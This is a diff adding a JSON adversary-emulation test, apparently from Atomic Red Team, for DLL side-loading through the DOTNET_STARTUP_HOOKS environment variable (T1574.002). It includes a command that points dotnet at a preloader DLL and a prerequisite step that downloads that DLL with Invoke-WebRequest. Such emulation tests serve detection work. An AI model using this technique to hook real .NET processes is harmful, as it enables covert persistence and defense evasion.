@@ -1,0 +1,49 @@
+{
+    "name": "DLL Side-Loading using the dotnet startup hook environment variable",
+    "description": "Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1) ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "set DOTNET_STARTUP_HOOKS=\"#{preloader_dll}\"\ndotnet -h > nul\necho.\n",
+        "cleanup_command": "taskkill /F /IM #{process_name} >nul 2>&1\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1574.002",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation",
+        "Defense Evasion"
+    ],
+    "technique": "DLL Side-Loading",
+    "source": "ART",
+    "uuid": "d322cdd7-7d60-46e3-9111-648848da7c02",
+    "arguments": {
+        "process_name": {
+            "description": "Name of the created process",
+            "type": "string",
+            "default": "calculator.exe"
+        },
+        "preloader_dll": {
+            "description": "library for interfacing with the dotnet framework",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1574.002\\bin\\preloader.dll"
+        }
+    },
+    "preconditions": [
+        {
+            "description": ".Net SDK must be installed\n",
+            "prereq_command": "if (Test-Path \"C:\\Program Files\\dotnet\\dotnet.exe\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "winget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h > $null\necho.\n"
+        },
+        {
+            "description": "preloader must exist\n",
+            "prereq_command": "if (Test-Path \"#{preloader_dll}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/preloader?raw=true\" -OutFile \"#{preloader_dll}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
